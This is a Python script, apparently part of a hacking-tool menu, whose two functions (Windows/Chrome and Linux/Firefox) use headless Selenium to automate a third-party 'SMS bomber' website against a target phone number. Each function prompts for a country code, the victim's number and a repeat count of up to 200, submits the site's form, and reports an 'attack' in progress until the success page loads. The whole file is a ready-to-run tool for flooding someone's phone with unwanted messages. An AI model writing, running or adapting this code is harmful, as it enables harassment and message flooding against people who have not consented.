def smsbombingwin():
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import Select
    import platform
    from about import menu,about
    import time
    import os

    
    def remsp(num):
        num = num.replace(' ', '')
        num = num.replace('-', '')
        return num

    cc = input("    |-$ Enter Your Country Code (Without +) > ")
    ph = input('    |-$ Enter Target Number > ' + " +" + cc + " ")

    ph = remsp(ph)

    if len(cc) >= 4 or len(cc) < 1:
        print('    |-$ Invalid Country Code.. Country Codes Are Generally 1-3 digits...')
        return

    if len(ph) <= 6:
        print('    |-$ Invalid Phone Number..')
        return

    for cch in str(cc + ph):
        if not cch.isdigit():
            print('    |-$ Phone Number Must Consist Of Numbers Only')
            return

    repcount = int(input('    |-$ How many times (1-200) ? > '))

    options = Options()
    options.headless = True
    options.add_argument("--log-level=3")

    wcr_dict = os.getcwd() + '//chromedriver.exe'

    browser = webdriver.Chrome(executable_path=wcr_dict, chrome_options=options)

    os.system('cls')
    about()
    menu()
    print(f'''    |-> 2
    |-$ Enter Your Country Code (Without +) > {cc}
    |-$ Enter Target Number > +{cc} {ph}''')

    print(
f'''    |-$ How many times (1-200) ? > {repcount}''')
    
    print("    |-$ Attack Under Progress (Don't Close The Terminal) !")

    if cc == '91':
        browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.ID, "mobno")))
        finally:
            pass

    else:
        browser.get('https://mytoolstown.com/smsbomber/change.php')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.NAME, "countrycode")))
        finally:
            pass


        select = Select(browser.find_element_by_name('countrycode'))

        try:
            select.select_by_value(cc)
        except:
            print('    |-$ invalid country code !')
            return
        finally:
            pass

        browser.find_element_by_name('submit').click()
        time.sleep(5)
        browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.ID, "mobno")))
        finally:
            pass


    browser.find_element_by_id('mobno').send_keys(int(ph))
    time.sleep(5)
    browser.find_element_by_id('count').send_keys(repcount)
    time.sleep(1)
    browser.find_element_by_id('count').send_keys(Keys.TAB + Keys.ARROW_DOWN + Keys.ARROW_DOWN + Keys.ENTER)

    while browser.current_url != 'https://mytoolstown.com/smsbomber/success.php':
        time.sleep(5)


    print(
'''    |-} Done !
    |-----------------------------------------------------------''')
    time.sleep(2)
    browser.quit()
def smsbombinglinux():
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.firefox.options import Options
    from selenium.webdriver.support.ui import Select
    import platform
    from about import menu,about
    import time
    import os

    
    def remsp(num):
        num = num.replace(' ', '')
        num = num.replace('-', '')
        return num

    cc = input("    |-$ Enter Your Country Code (Without +) > ")
    ph = input('    |-$ Enter Target Number > ' + " +" + cc + " ")

    ph = remsp(ph)

    if len(cc) >= 4 or len(cc) < 1:
        print('    |-$ Invalid Country Code.. Country Codes Are Generally 1-3 digits...')
        return

    if len(ph) <= 6:
        print('    |-$ Invalid Phone Number..')
        return

    for cch in str(cc + ph):
        if not cch.isdigit():
            print('    |-$ Phone Number Must Consist Of Numbers Only')
            return

    repcount = int(input('    |-$ How many times (1-200) ? > '))

    options = Options()
    options.headless = True
    options.add_argument("--log-level=3")

    cr_dict = os.getcwd() + '/geckodriver'

    browser = webdriver.Firefox(executable_path=cr_dict , options=options)

    print("    |-$ Attack Under Progress (Don't Close The Terminal) !")

    if cc == '91':
        browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.ID, "mobno")))
        finally:
            pass

    else:
        browser.get('https://mytoolstown.com/smsbomber/change.php')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.NAME, "countrycode")))
        finally:
            pass


        select = Select(browser.find_element_by_name('countrycode'))

        try:
            select.select_by_value(cc)
        except:
            print('    |-$ invalid country code !')
            return
        finally:
            pass

        browser.find_element_by_name('submit').click()
        time.sleep(5)
        browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.ID, "mobno")))
        finally:
            pass


    browser.find_element_by_id('mobno').send_keys(int(ph))
    time.sleep(5)
    browser.find_element_by_id('count').send_keys(repcount)
    time.sleep(1)
    browser.find_element_by_id('count').send_keys(Keys.TAB + Keys.ARROW_DOWN + Keys.ARROW_DOWN + Keys.ENTER)

    while browser.current_url != 'https://mytoolstown.com/smsbomber/success.php':
        time.sleep(5)


    print(
'''    |-} Done !
    |-----------------------------------------------------------''')
    time.sleep(2)
    browser.quit()
